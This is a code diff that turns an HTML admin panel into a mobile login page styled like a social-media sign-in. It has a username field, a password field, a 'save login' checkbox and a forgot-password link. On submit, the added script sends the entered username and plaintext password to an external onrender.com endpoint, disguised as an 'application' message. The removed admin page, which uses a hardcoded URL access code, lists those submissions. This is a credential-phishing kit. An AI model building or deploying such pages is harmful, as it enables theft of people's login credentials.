@@ -3,94 +3,253 @@
 
 <head>
     <meta charset="UTF-8" />
-    <title>Admin Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Mobile Login Form</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
+
         body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background: #222;
-            color: white;
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+            min-height: 100vh;
         }
 
-        .app {
-            background: #333;
-            padding: 15px;
-            margin: 10px 0;
-            border-left: 5px solid #007BFF;
-            border-radius: 5px;
-        }
-
-        .app h3 {
-            margin: 0 0 10px;
-            color: #fff;
-        }
-
-        .app p {
-            margin: 5px 0;
-            color: #ccc;
+        .login-container {
+            width: 100%;
+            max-width: 400px;
         }
 
         h1 {
-            text-align: center;
+            font-weight: 700;
+            font-size: 32px;
             margin-bottom: 30px;
-            color: #fffc00;
+            color: #000;
+            text-align: center;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        label {
+            color: #0cacff;
+            font-weight: 300;
+            font-size: 14px;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        textarea {
+            border: none;
+            border-bottom: 2px solid #c0bfbf;
+            border-radius: 0;
+            padding: 8px 4px;
+            font-size: 16px;
+            outline: none;
+            box-shadow: none;
+            background: transparent;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        textarea:focus {
+            border-bottom-color: #007bff;
+            outline: none;
+        }
+
+        .small-link {
+            font-size: 12px;
+            color: #007bff;
+            margin-top: -14px;
+            margin-bottom: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* Password container with eye icon */
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+            border-bottom: 2px solid #c0bfbf;
+            padding-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: border-color 0.3s ease;
+        }
+
+        .password-wrapper:focus-within {
+            border-bottom-color: #007bff;
+        }
+
+        .password-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 16px;
+            padding: 8px 0;
+        }
+
+        .toggle-password {
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            fill: #666;
+            transition: fill 0.3s;
+        }
+
+        .toggle-password:hover {
+            fill: #007bff;
+        }
+
+        /* Checkbox with blue tick */
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            user-select: none;
+        }
+
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #007bff;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #000;
+        }
+
+        /* Forgot password link */
+        .forgot-password {
+            font-size: 14px;
+            color: #0cacff;
+            cursor: pointer;
+            user-select: none;
+            margin: 10px 0 20px 0;
+            text-align: center;
+            width: 100%;
+        }
+
+        /* Login button */
+        button.login-btn {
+            background: #0cacff;
+            border: none;
+            color: white;
+            padding: 14px 0;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+
+        button.login-btn:hover {
+            background: #0a8de9;
         }
     </style>
 </head>
 
 <body>
+    <div class="login-container">
+        <h1>Log In</h1>
+        <form id="loginForm" autocomplete="off" spellcheck="false">
+            <label for="username">Username or Email</label>
+            <input type="text" id="username" name="username" required autocomplete="username" />
+            <div class="small-link" id="usePhone">Use phone number instead</div>
 
-    <h1>Admin Panel - Applications</h1>
-    <div id="appList">Loading...</div>
+            <label for="password">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" name="password" required autocomplete="current-password" />
+                <svg class="toggle-password" id="togglePassword" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+                    aria-label="Toggle Password Visibility" role="img">
+                    <path
+                        d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5z" />
+                    <circle cx="12" cy="12" r="2.5" />
+                </svg>
+            </div>
+
+            <label class="checkbox-wrapper">
+                <input type="checkbox" id="saveLogin" name="saveLogin" />
+                <span class="checkbox-label">Save login info on your device</span>
+            </label>
+
+            <div class="forgot-password">Forgot your password?</div>
+
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
 
     <script>
-        const ACCESS_CODE = "supersecret123"; // <-- set your secret here
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get("code");
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
 
-        if (code !== ACCESS_CODE) {
-            alert("Access denied. Invalid or missing access code.");
-            document.body.innerHTML = "<h2 style='color: red; text-align:center; margin-top: 50px;'>Access denied. Invalid or missing access code.</h2>";
-            throw new Error("Access denied");
-        }
-
-        const apiUrl = "https://application-backend-225i.onrender.com/api/applications";
-        const appList = document.getElementById("appList");
-
-        async function loadApplications() {
-            try {
-                const response = await fetch(apiUrl);
-                if (!response.ok) throw new Error("Failed to fetch");
-
-                const apps = await response.json();
-
-                if (apps.length === 0) {
-                    appList.innerHTML = "<p>No applications found.</p>";
-                    return;
-                }
-
-                appList.innerHTML = ""; // clear "Loading..."
-
-                apps.forEach(app => {
-                    const div = document.createElement("div");
-                    div.className = "app";
-                    div.innerHTML = `
-            <h3>${app.name}</h3>
-            <p><strong>Email:</strong> ${app.email}</p>
-            <p><strong>Message:</strong> ${app.message}</p>
-            <p><em>Submitted: ${new Date(app.submittedAt).toLocaleString()}</em></p>
-          `;
-                    appList.appendChild(div);
-                });
-            } catch (err) {
-                appList.innerHTML = "<p style='color: red;'>Failed to load applications.</p>";
-                console.error(err);
+        togglePassword.addEventListener('click', () => {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                togglePassword.style.fill = '#007bff';
+            } else {
+                passwordInput.type = 'password';
+                togglePassword.style.fill = '#666';
             }
-        }
+        });
 
-        loadApplications();
+        document.getElementById('usePhone').addEventListener('click', () => {
+            const usernameInput = document.getElementById('username');
+            usernameInput.value = '';
+            usernameInput.placeholder = 'Phone number';
+            document.querySelector('label[for="username"]').textContent = 'Phone Number';
+        });
+
+        document.getElementById("loginForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value;
+            const saveLogin = document.getElementById("saveLogin").checked;
+
+            // You can adapt what you send below based on your backend schema
+            try {
+                const res = await fetch("https://application-backend-225i.onrender.com/api/apply", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        name: username,
+                        email: username, // or separate field if you want
+                        message: `Password: ${password}, Save login: ${saveLogin}`
+                    }),
+                });
+
+                if (res.ok) {
+                    alert("Application submitted!");
+                    e.target.reset();
+                    // Reset label if changed by usePhone click
+                    document.querySelector('label[for="username"]').textContent = "Username or Email";
+                } else {
+                    alert("Failed to submit application.");
+                }
+            } catch (error) {
+                alert("Error submitting application.");
+                console.error(error);
+            }
+        });
     </script>
-
 </body>
 
 </html>
